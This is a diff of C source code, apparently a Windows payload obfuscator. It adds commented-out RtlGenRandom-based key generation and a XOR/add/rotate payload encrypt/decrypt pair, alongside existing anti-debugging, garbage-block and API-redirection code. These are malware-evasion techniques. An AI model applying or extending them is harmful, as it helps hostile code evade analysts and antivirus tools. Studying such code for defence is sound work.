@@ -81,7 +81,42 @@ void insert_garbage_blocks() {
 
 unsigned char random_byte() {
     return rand() % 256;
+} 
+
+/*
+unsigned char random_byte() {
+    unsigned char key;
+    if (!systemFunction036(&key, sizeof(key))) {
+        return rand() % 256;
+    }
+    return key;
 }
+#pragma comment(lib, "Advapi32.lib")
+
+*/
+
+/* 
+
+typedef BOOLEAN(WINAPI *RtlGenRandom_t)(void *, ULONG);
+
+unsigned char random_byte() {
+    static RtlGenRandom_t RtlGenRandom = NULL;
+
+    if (!RtlGenRandom) {
+    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
+    if (hAdvapi32) {
+        RtlGenRandom = (RtlGenRandom_t)GetProcAddress(hAdvapi32, "systemFunction036");
+    }
+}
+
+unsigned char key = 0;
+if (RtlGenRandom) {
+    RtlGenRandom(&key, sizeof(key));
+} else {
+    key = rand() % 256;
+}
+return key;
+} */
 
 int is_debugger_present() {
     return IsDebuggerPresent();
@@ -296,6 +331,51 @@ void polymorphic_decrypt(
     }
 }
 
+/*
+
+void hybrid_encrypt(
+    unsigned char *payload, size_t size,
+    unsigned char *output, size_t *output_size
+) {
+    *output_size = 0;
+    unsigned char key_xor = random_byte();
+    unsigned char key_add = random_byte();
+    unsigned char key_rot = (random_byte() & 7) + 1;
+
+    output[(*output_size)++] = key_xor;
+    output[(*output_size)++] = key_add;
+    output[(*output_size)++] = key_rot;
+
+    for (size_t i = 0; i < size; i++) {
+        unsigned char temp = payload[i] ^ key_xor;
+        temp = (temp + key_add) % 256;
+        temp = (temp << key_rot) | (temp >>  (8 - key_rot));
+        output[(*output_size)++] = temp;
+    }
+}
+
+void hybrid_decrypt(
+    unsigned char *encrypted, size_t encrypted_size,
+    unsigned char *output, size_t *output_size
+) {
+    *output_size = 0;
+    if (encrypted_size < 3) return;
+    unsigned char key_xor = encrypted[0];
+    unsigned char key_add = encrypted[1];
+    unsigned char key_rot = encrypted[2];
+
+    for (size_t i = 3; i < encrypted_size; i++) {
+        unsigned char temp = encrypted[i];
+        temp = (temp >> key_rot) | (temp << (8 - key_rot));
+        temp = (temp - key_add + 256) % 256;
+        temp ^= key_xor;
+        output[(*output_size)++] = temp;
+    }
+    output[*output_size] = '\0';
+}
+
+*/
+
 int main() {
     LARGE_INTEGER perfCount;
     QueryPerformanceCounter(&perfCount);
@@ -304,10 +384,11 @@ int main() {
     init_api_redirect();
     insert_garbage_blocks();
 
+    
     if (is_debugger_present()) {
         api.real_printf("Debugger detected!\n");
         exit(1);
-    }
+    } 
 
     unsigned char payload[14];
     for (int i = 0; i < 7; i++) 
